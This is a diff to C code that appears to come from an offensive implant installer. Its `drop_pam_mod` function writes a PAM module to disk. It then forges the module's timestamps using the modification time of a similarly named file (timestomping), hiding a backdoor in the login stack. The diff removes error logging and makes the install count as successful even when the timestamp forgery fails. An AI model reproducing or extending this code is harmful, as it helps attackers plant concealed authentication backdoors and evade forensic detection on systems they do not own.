@@ -76,10 +76,6 @@ time_t best_mtime(const char *filepath)
                         most_matched = curr;
                         best_time = sb.st_mtime;
                     }
-                    else
-                    {
-                        DEBUG_LOG("stat failed on %s (errno: %d)\n", curr_name, errno);
-                    }
                 }
                 // assume alphabetical order means best match should increase to a global max
                 else if (most_matched > 0)
@@ -113,30 +109,15 @@ int drop_pam_mod(char* mod_path)
             {
                 DEBUG_LOG("Dropped pam module : %s\n", mod_path);
 
+                retval = 0;  // install has been successful - timestamp fix is optional
+
                 if (0 == utime(mod_path, &times))
                 {
                     DEBUG_LOG("Set timestamps for %s\n", mod_path);
-                    retval = 0;
                 }
-                else
-                {
-                    DEBUG_LOG("Could not set timestamps for %s (errno: %d)\n", mod_path, errno);
-                }
-            }
-            else
-            {
-                DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", mod_path, errno);
             }
             fclose(pam_mod);
         }
-        else
-        {
-            DEBUG_LOG("Could not open %s (errno: %d)\n", mod_path, errno);
-        }
-    }
-    else
-    {
-        DEBUG_LOG("Could not create timestamp for %s (errno: %d)\n", mod_path, errno);
     }
 
     return retval;
